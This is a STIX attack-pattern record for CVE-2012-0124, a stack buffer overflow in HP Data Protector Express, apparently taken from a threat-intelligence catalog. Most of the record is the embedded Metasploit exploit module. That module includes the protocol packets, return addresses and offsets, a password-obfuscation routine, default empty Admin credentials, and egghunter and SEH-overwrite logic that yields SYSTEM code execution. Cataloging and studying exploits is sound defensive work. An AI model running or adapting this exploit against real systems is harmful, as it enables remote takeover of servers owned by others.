{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3c19ff24-1d3e-4dca-a637-3ebd909a8fb5",
    "created": "2024-08-14T16:47:16.824594Z",
    "modified": "2024-08-14T16:47:16.824598Z",
    "name": "HP Data Protector Create New Folder Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in HP Data Protector 5. The overflow occurs in the creation of new folders, where the name of the folder is handled in a insecure way by the dpwindtb.dll component. While the overflow occurs in the stack, the folder name is split in fragments in this insecure copy. Because of this, this module uses egg hunting to search a non corrupted copy of the payload in the heap. On the other hand the overflowed buffer is stored in a frame protected by stack cookies, because of this SEH handler overwrite is used.  Any user of HP Data Protector Express is able to create new folders and trigger the vulnerability. Moreover, in the default installation the 'Admin' user has an empty password. Successful exploitation will lead to code execution with the privileges of the \"dpwinsdr.exe\" (HP Data Protector Express Domain Server Service) process, which runs as SYSTEM by default. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/hp_dataprotector_new_folder.rb",
            "external_id": "hp_dataprotector_new_folder.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0124"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2012/07/06/an-example-of-egghunting-to-exploit-cve-2012-0124"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP Data Protector Create New Folder Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in HP Data Protector 5. The overflow\n        occurs in the creation of new folders, where the name of the folder is handled in a\n        insecure way by the dpwindtb.dll component. While the overflow occurs in the stack, the\n        folder name is split in fragments in this insecure copy. Because of this, this module\n        uses egg hunting to search a non corrupted copy of the payload in the heap. On the other\n        hand the overflowed buffer is stored in a frame protected by stack cookies, because of\n        this SEH handler overwrite is used.\n\n        Any user of HP Data Protector Express is able to create new folders and trigger the\n        vulnerability. Moreover, in the default installation the 'Admin' user has an empty\n        password. Successful exploitation will lead to code execution with the privileges of\n        the \"dpwinsdr.exe\" (HP Data Protector Express Domain Server Service) process, which\n        runs as SYSTEM by default.\n      },\n      'Author'         =>\n        [\n          'juan vazquez',\n          'sinn3r'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-0124' ],\n          [ 'OSVDB', '80105' ],\n          [ 'BID', '52431' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2012/07/06/an-example-of-egghunting-to-exploit-cve-2012-0124' ]\n        ],\n      'Payload'        =>\n        {\n          'Space' => 2000,\n          'BadChars' => \"\\x00\\x2f\\x5c\",\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['HP Data Protector Express 6.0.00.11974 / Windows XP SP3',\n            {\n              'Ret' => 0x66dd3e49, # ppr from ifsutil.dll (stable over windows updates on June 26, 2012)\n              'Offset' => 2734\n            }\n          ],\n          ['HP Data Protector Express 5.0.00.59287 / Windows XP SP3',\n            {\n              'Ret' => 0x66dd3e49, # ppr from ifsutil.dll (stable over windows updates on June 26, 2012)\n              'Offset' => 2730\n            }\n          ],\n        ],\n      'DefaultTarget' => 0,\n      'Privileged'     => true,\n      'DisclosureDate' => '2012-03-12'\n      ))\n      register_options(\n      [\n        Opt::RPORT(3817),\n        OptString.new('USERNAME', [ true, 'The username to authenticate as','Admin' ]),\n        OptString.new('PASSWORD', [ false, 'The password for the specified username','' ])\n      ])\n  end\n\n  # dpwinsup!SvcEncrypt2\n  def encrypt_password(password)\n    if not password or password.empty?\n      return \"\"\n    end\n\n    result = \"\"\n    count = 0x80\n\n    i = 0\n    dl = 0\n    al = password.unpack(\"C*\")[i]\n\n    while count > 2\n      al = al + dl\n      if al >= 0x100 then al = al - 0x100 end\n      al = al + 0x22\n      if al >= 0x100 then al = al - 0x100 end\n      al = al ^ 0x2b\n      if al >= 0x100 then al = al - 0x100 end\n      al = al + 0x4c\n      if al >= 0x100 then al = al - 0x100 end\n      al = al ^ 0x5f\n      if al >= 0x100 then al = al - 0x100 end\n      al = al - dl\n      if al >= 0x100 then al = al - 0x100 end\n      bl = al\n      if bl >= 0x100 then bl = bl - 0x100 end\n      bl = bl >> 4\n      if bl >= 0x100 then bl = bl - 0x100 end\n      bl = bl + 0x41\n      if bl >= 0x100 then bl = bl - 0x100 end\n      result << [bl].pack(\"C\")\n      al = al & 0xf\n      if al >= 0x100 then al = al - 0x100 end\n      al = al + 0x41\n      if al >= 0x100 then al = al - 0x100 end\n      i = i + 1\n      result << [al].pack(\"C\")\n      dl = dl + 5\n      if dl >= 0x100 then dl = dl - 0x100 end\n      count = count - 2\n      if i >= password.length\n        return result\n      end\n      al = password.unpack(\"C*\")[i]\n\n    end\n    return result\n  end\n\n  def exploit\n    connect\n\n    machine_name = rand_text_alpha(15)\n\n    print_status(\"#{sock.peerinfo} - Sending Hello Request\")\n\n    if target.name =~ /HP Data Protector Express 5/\n      hello =  \"\\x54\\x84\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x01\\x00\\x00\\x92\\x00\\x00\\x00\"\n      hello << \"\\x3a\\x53\\xa5\\x71\\x06\\x20\\x80\\x00\" << \"\\x6a\\x02\\xaf\\x03\\xf8\\xc5\\xc7\\x02\"\n      hello << \"\\x01\\x00\\x00\\x00\\xc0\\xa8\\x01\\x85\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      hello << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      hello << \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      hello << \"\\x00\\x00\\x00\\x00\"\n      hello << machine_name << \"\\x00\"\n      hello << \"\\x5b\\x2e\\xad\\x71\\x50\\x03\\x00\\x00\" << \"\\xff\\xff\\x00\\x00\\x06\\x10\\x00\\x44\"\n      hello << \"\\x74\\x62\\x3a\\x20\\x43\\x6f\\x6e\\x74\" << \"\\x65\\x78\\x74\\x00\\xf8\\x31\\x0a\\x10\"\n      hello << \"\\x50\\x03\\x00\\x00\\xff\\xff\\x00\\x00\" << \"\\x06\\x10\\x00\\x00\\x6c\\xfa\"\n    else # HP Data Protector 6\n      hello = \"\\x54\\x84\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x01\\x01\\x00\\x00\\x92\\x00\\x00\\x00\"\n      hello << \"\\x3a\\x53\\xa5\\x71\\x03\\x20\\x80\\x00\" << \"\\xdf\\x6e\\x4a\\x00\\xbf\\x41\\x3b\\x00\"\n      hello << \"\\x01\\x00\\x00\\x00\\xc0\\xa8\\x01\\x84\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      hello << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      hello << \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      hello << \"\\x00\\x00\\x00\\x00\"\n      hello << machine_name << \"\\x00\"\n      hello << \"\\x5b\\x2e\\xad\\x71\\x7c\\x03\\x00\\x00\" << \"\\xff\\xff\\x00\\x00\\x06\\x10\\x00\\x44\"\n      hello << \"\\x74\\x62\\x3a\\x20\\x43\\x6f\\x6e\\x74\" << \"\\x65\\x78\\x74\\x00\\x08\\xf4\\x06\\x10\"\n      hello << \"\\x7c\\x03\\x00\\x00\\xff\\xff\\x00\\x00\" << \"\\x06\\x10\\x00\\x00\\x70\\xfa\"\n    end\n\n    sock.put(hello)\n    hello_response = sock.get_once(-1, 10)\n\n    if not hello_response or hello_response.empty?\n      print_error(\"#{sock.peerinfo} - The Hello Request haven't had response\")\n      return\n    end\n\n    print_status(\"#{sock.peerinfo} - Sending Authentication Request\")\n\n    if target.name =~ /HP Data Protector Express 5/\n      auth =  \"\\x51\\x84\\x00\\x00\\x02\\x02\\x02\\x32\" << \"\\x18\\x00\\x00\\x00\\xa4\\x01\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x01\\x10\\x00\\x00\" << \"\\xd1\\x00\\x97\\x4e\\xb8\\xe7\\x03\\x00\"\n      auth << \"\\xd5\\x21\\xe6\\xff\"\n    else # HP Data Protector 6\n      auth = \"\\x51\\x84\\x00\\x00\\x02\\x02\\x02\\x32\" << \"\\x18\\x00\\x00\\x00\\xa4\\x01\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x41\\x64\\x6d\\x69\" << \"\\x6e\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n      auth << \"\\x00\\x00\\x00\\x00\\x01\\x10\\x00\\x00\" << \"\\x41\\xbf\\xf1\\x4f\\x67\\xdd\\x05\\x00\"\n      auth << \"\\x73\\xd8\\xed\\xff\"\n    end\n\n    user = datastore['USERNAME']\n    pass = encrypt_password(datastore['PASSWORD'])\n    auth[20, user.length] = user\n    if pass and not pass.empty?\n      auth[276, pass.length] = pass\n    end\n\n    sock.put(auth)\n    auth_response = sock.get_once(-1, 10)\n    if not auth_response or auth_response.empty?\n      print_error(\"#{sock.peerinfo} - The Authentication Request haven't had response\")\n      return\n    end\n\n    print_status(\"#{sock.peerinfo} - Sending Token Request\")\n    request_token =  \"\\x51\\x84\\x00\\x00\\x02\\x02\\x02\\x32\" << \"\\x02\\x00\\x00\\x00\\x24\\x00\\x00\\x00\"\n    request_token << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    request_token << \"\\x07\\x00\\x00\\x00\"\n\n    sock.put(request_token)\n    response_token = sock.get_once(-1, 10)\n    if not response_token or response_token.empty?\n      print_error(\"#{sock.peerinfo} - The Token Request haven't had response\")\n      return\n    end\n\n    print_status(\"#{sock.peerinfo} - Sending Home Identifier Request\")\n    request_home_identifier =  \"\\x51\\x84\\x00\\x00\\x02\\x02\\x02\\x32\" << \"\\x03\\x00\\x00\\x00\\x30\\x00\\x00\\x00\"\n    request_home_identifier << \"\\x00\\x00\\x00\\x00\"\n    request_home_identifier << response_token[-8,8]\n    request_home_identifier << \"\\x02\\x10\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x01\\x00\\xff\\xff\"\n    request_home_identifier << \"\\x00\\x00\\x00\\x00\"\n\n    sock.put(request_home_identifier)\n    response_home_identifier = sock.get_once(-1, 10)\n    if not response_home_identifier or response_home_identifier.empty?\n      print_error(\"#{sock.peerinfo} - The Home Identifier Request haven't had response\")\n      return\n    end\n\n    print_status(\"#{sock.peerinfo} - Sending Home Contents Request\")\n    request_home_contents =  \"\\x51\\x84\\x00\\x00\\x02\\x02\\x02\\x32\" << \"\\x04\\x00\\x00\\x00\\x3c\\x00\\x00\\x00\"\n    request_home_contents << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    request_home_contents << response_token[-8,8]\n    request_home_contents << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x02\\x10\\x00\\x00\"\n    request_home_contents << response_home_identifier[24,9] << \"\\00\\x00\\x00\\x00\\x0d\\x00\\x00\"\n\n    sock.put(request_home_contents)\n    response_home_contents = sock.get_once(-1, 10)\n    if not response_home_contents or response_home_contents.empty?\n      print_error(\"#{sock.peerinfo} - The Home Contents Request haven't had response\")\n      return\n    end\n\n    hunter,egg = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true, :eggtag => 'w00t' })\n    my_payload = egg\n    my_payload << rand_text(target['Offset']-my_payload.length)\n    my_payload << generate_seh_record(target.ret)\n    my_payload << hunter\n\n    print_status(\"#{sock.peerinfo} - Sending Create Object Request\")\n    create_object_request =  \"\\x51\\x84\\x00\\x00\\x02\\x02\\x02\\x32\" << \"\\x06\\x00\\x00\\x00\\x39\\x11\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\"\n    create_object_request << response_token[-8,8]\n    create_object_request << response_home_contents[20, 14] << \"\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x20\\x03\\x00\\x00\\x00\\x00\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    create_object_request << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\"\n    create_object_request << my_payload << \"\\x00\"\n\n    create_object_request[12, 4] = [create_object_request.length].pack(\"V\")\n\n    sock.put(create_object_request)\n\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-03-12",
    "x_mitre_platforms": [
        "win'"
    ]
}